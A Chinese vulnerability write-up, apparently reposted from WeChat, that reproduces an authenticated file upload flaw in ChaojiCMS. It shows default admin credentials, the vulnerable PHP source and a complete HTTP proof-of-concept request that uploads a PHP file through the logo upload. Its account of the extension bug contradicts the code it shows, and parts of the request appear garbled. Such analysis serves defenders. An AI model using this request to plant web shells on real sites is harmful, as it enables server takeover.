<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Gbj8kLVK6RafidetSb67xQ)

  

  

前言

![图片](https://mmbiz.qpic.cn/mmbiz_png/nE1wniah9EGQOAibRG1M2E64gUmebTdWmu4PCeZEnP9o2smfR1LT9AVX4E0rZLsiaQseicVh1xzn6zuPI3CatXFHmA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/x2A34tB6DJ1OkPcdribDzibshJwyiacGV0dL6xyJSMoUODic9LUULgNOnWiciaLpD2A7HtR7e6GqhqAkw8zXBObGceYA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

超级CMS网站管理系统，专为SEO而生，利于SEO排名，模块化，开源，打造符合搜索引擎的CMS系统。其存在文件上传漏洞。攻击者可利用该漏洞上传木马文件，获得服务器权限。

  

文件说明

  

+ article_view.php 文章详情页模板

+ category_news.php 栏目页模板（新闻）

+ category_view.php 栏目页模板（默认）

+ footer.php 公用底部文件

+ header.php 公用顶部文件（top.php和index.php调用的）

+ index.php 首页模板文件

+ search_index.php 搜索主页模板

+ search_list.php 搜索列表页模板（搜索结果页模板）

+ single_about.php 单页关于我们

+ single_case.php 单页成功案例

+ single_contactus.php 单页联系我们

+ single_service.php 单页服务

+ tags_index.php tag标签首页访问地址：/tags.html

+ tags_list.php tag列表模板

+ top.php 公用顶部模板

![图片](https://mmbiz.qpic.cn/mmbiz_png/Rhl7Fe1Ew2icdiaxAoicRDTOcic6uZqjKNRuQTmL2KnOQaSBwas6DeYNdq479WEFto9n2bssQXlvVic2bGGlQghxWVg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

  

环境搭建

![图片](https://mmbiz.qpic.cn/mmbiz_png/nE1wniah9EGQOAibRG1M2E64gUmebTdWmu4PCeZEnP9o2smfR1LT9AVX4E0rZLsiaQseicVh1xzn6zuPI3CatXFHmA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

1. 系统前台采用伪静态方式 伪静态规则详见.htaccess

2. 网站安装地址: http://IP/install.php 

3. 如果没有这个文件,请直接输入: http://IP/application/install/index.php

4. 网站后台登录地址:

    - 如果有admin.php可以直接访问 http://IP/admin.php；

    - 如果没有admin.php请采用真实地址访问：http://IP/index.php?admin-master-login

5. 默认账号chaojicms/默认密码chaojicms

6. 前台地址: http://IP/index.php

本地测试建议使用`http://127.0.0.1`或`http://localhost`其他地址暂不支持使用服务端服务.

```
`http://127.0.0.1``API接口用户:test``API接口token:rjnHvNQCgcd4W2s8u7AoRGSRFz5Nyu`
```

  

```
`http://localhost``API接口用户:niuge```API接口`token:naTIfCM1R4rGEUDUeFZM0Z1GwDX4fx``
```

﻿ 超级CMS系统要求 PHP5.4以上版本

﻿ 推荐使用Linux + Apache + Mysql + PHP

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

  

  

漏洞复现

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

登录后台http://IP/index.php?admin-master-login

默认账号：chaojicms

默认密码：chaojicms

登录成功，管理后台

  

存在漏洞的位置是file.class.php文件中的getFileExtName()方法

```
`public function getFileExtName($filename){``$filename = strtolower($filename);``$exts = explode('.',$filename);``$ext = $exts[count($exts)-1];``if(strpos($ext,'?') >= 0){``$ext = explode('?',$ext);``return $ext[0];``}``else``return $ext;``}`
```

以其中一个图片上传为例子，漏洞位于webset.master.php文件中的setweb()方法

```
`private function setweb(){``$Lang=$this->G->loadLang();``if($_SESSION['input_token']!="" && $_SESSION['input_token']==$_POST['input_token']){``$_SESSION['input_token']='';``$dsw =$_POST['dsw'];``if($dsw){` `if(is_uploaded_file($_FILES['file']['tmp_name'])){` `$sfile=$_FILES["file"];` `$dsw['web_logo']=$this->files->uploadFile($sfile,UPLOAD_PATH_IMG);` `}` `if(is_uploaded_file($_FILES['file_ewm']['tmp_name'])){` `$sfile=$_FILES["file_ewm"];` `$dsw['web_erweima']=$this->files->uploadFile($sfile,UPLOAD_PATH_IMG);` `}``foreach($dsw as $k=>$v){``$this->webconfig->update(array('value'=>$v),array('varname'=>$k));``}``$message = array(``'CodeType' =>300,``"message" => $Lang['set']['UpdateSuccess'],``"callbackType" => 'forward',``"forwardUrl" => ADMIN_URL."webset"``);``$this->G->R($message);``}``}else{``$ListAll=$this->webconfig->getAll();``if($ListAll){``$ListOne=array();``foreach($ListAll as $k=>$v){``$ListOne[$v['varname']]=$v['value'];``}``$this->tpl->assign("FormTitle",$Lang['set']['FormTitle']);``$this->tpl->assign('ListOne',$ListOne);``$_SESSION['input_token'] = md5(rand(100,1000));``$this->tpl->assign("input_token",$_SESSION['input_token']);``$this->tpl->assign("FormAction",ADMIN_URL."webset-setweb");``$this->tpl->assign("Lang",$Lang);``$this->tpl->display('webset');``}``}``}`
```

  

看上传网站logo的PHP代码

```
$dsw['web_logo']=$this->files->uploadFile($sfile,UPLOAD_PATH_IMG);
```

  

跟进uploadFile()方法

```
`public function uploadFile($file,$updir,$sExtension = NULL,$name = NULL){``if(!$sExtension)$sExtension = $this->getFileExtName($file['name']);``if(!$name)$name = time().rand(1000,9999);``if(!file_exists('.'.$updir))$this->mdir('.'.$updir);``$url = $updir.$name.'.'.$sExtension;``if(file_exists($url))unlink($url);``move_uploaded_file($file['tmp_name'],'.'.$url);``if (file_exists($url)){``$oldumask = umask(0);``chmod($url,0777);``umask($oldumask);``}``return $url;``}`
```

  

  

注意这一行代码：

```
if(!$sExtension)$sExtension = $this->getFileExtName($file['name']);
```

  

  

这里调用getFileExtName()方法获取文件扩展名，但这里并没有做严格的过滤，这里这是获取第一个“.”后面的字符，而不是最后一个“.”后面的真正扩展名。

```
`//获取文件扩展名``public function getFileExtName($filename){``$filename = strtolower($filename);``$exts = explode('.',$filename);``$ext = $exts[count($exts)-1];``if(strpos($ext,'?') >= 0){``$ext = explode('?',$ext);``return $ext[0];``}``else``return $ext;``}`
```

  

  

问题就出现在这里$exts = explode('.',$filename);，没有严格过滤，导致漏洞。

  

漏洞导致可以绕过直接上传。文件上传路径：

```
define('UPLOAD_PATH_IMG', '/static/upload/image/'.date('Ymd').'/');
```

例如上传shell.jpg.php。

  

在系统设置中的网站logo上传处，/index.php?admin-master-webset

  

构建Poc：

  

```
`POST /supre/index.php?admin-master-webset-setweb HTTP/1.1``Host: 127.0.0.1``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8``Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2``Accept-Encoding: gzip, deflate``Content-Type: multipart/form-data; boundary=---------------------------4629155813243096858546315035``Content-Length: 15605``Origin: http://127.0.0.1``Connection: close``Referer: http://127.0.0.1/supre/index.php?admin-master-webset-setweb``Cookie: PHPSESSID=55dpjfg85aa4b134j2b5lk8mu6``Upgrade-Insecure-Requests: 1``-----------------------------4629155813243096858546315035``Content-Disposition: form-data;` `8d6dc35e506fc23349dd10ee68dabb64``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_name]"``帅哥的网站``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_url]"``http://127.0.0.1/supre/``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_dir]"``/supre/``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_index]"``index.html``-----------------------------4629155813243096858546315035``Content-Disposition: form-data;` `Content-Type: image/jpeg``<?php phpinfo();?>``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_copyright]"``copyright © 2007-2018 www.chaojicms.com 版权所有``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_tongji]"``12``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_icp]"``湘ICP备16014093号-2``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[seo_title]"``超级CMS演示站点``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[seo_keywords]"``超级CMS,CMS,懂网站优化的系统``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[seo_description]"``超级CMS内容管理系统（以下简称产品）由SEO研究中心为了解决网站优化问题而研发的一套产品，本产品采用面向对象方式自助研发的MVC框架开发，它是一款高效开源的内容管理系统，产品基于PHP+MYSQL架构，可运行在Windows、Linux、MacOSX、Solaris等各种平台上``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[home_title]"``首页``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_email]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_qq]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_tel]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_phone]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_fax]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_address]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_worktime]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_kouhao]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_aboutus]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data;` `Content-Type: application/octet-stream``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[soft_user]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[soft_token]"``-----------------------------4629155813243096858546315035--`
```

  

  

在UploadFile方法中$url为我们最后上传的路径，其中$name = time().rand(1000,9999);最后会生成以日期和时间解析的UNIX时间戳，并加上随机生成的四位数然后拼接到$url中。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)